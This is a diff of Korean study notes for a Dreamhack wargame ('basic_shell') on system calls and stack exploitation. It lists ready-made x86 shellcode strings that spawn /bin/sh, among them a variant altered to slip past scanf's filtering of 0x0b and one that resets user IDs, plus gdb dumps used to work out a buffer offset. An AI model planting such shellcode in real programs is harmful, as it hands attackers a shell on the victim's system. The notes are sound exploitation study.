@@ -1,3 +1,5 @@
+
+[[Dreamhack - basic_shell]]
 # syscall
 시스템 콜은 함수
 필요한 기능과 인자에 대한 정보를 레지스터로 전달하면, 커널이 이를 읽어서 요청을 처리
@@ -453,9 +455,9 @@ $
 - 25 Bytes Shell Code (기본 쉘코드)
 `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80`
  
-
 - 26 Bytes Shell Code (scanf 우회 쉘코드)
 `\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80`
+scanf는 0x0b를 필터링하는 특징이 있는데, 기본 쉘코드에서 0x0b를 가지고 있으므로 해당 부분을 변형함
 
 - 41 Bytes Shell Code   (setreuid(geteuid(), getreuid()) 포함)
 `\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80`
@@ -552,7 +554,7 @@ End of assembler dump.
 입력값을 쓰레기 값으로 넣었을 때, 현재 실행에서 버퍼의 시작 위치는 `0xffffcea4`을 확인할 수 있고,
 ebp가 `0xffffcf08`가 이므로 버퍼의 시작 위치와 스텍의 끝 위치의 차이가 0x64 임을 알 수 있음
 해당 주소의 값들 자체는 매번 변할 순 있지만, 그 차이는 일정함
-```
+```sh
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
 $eax   : 0x13      
@@ -593,7 +595,7 @@ $cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
 gef➤  
 ```
 
-```
+```sh
 gef➤  x/80x 0xffffcea4
 0xffffcea4:	0x61616161	0x61616161	0x61616161	0x61616161
 0xffffceb4:	0x000a6161	0x01000000	0x0000000b	0xf7fc4540
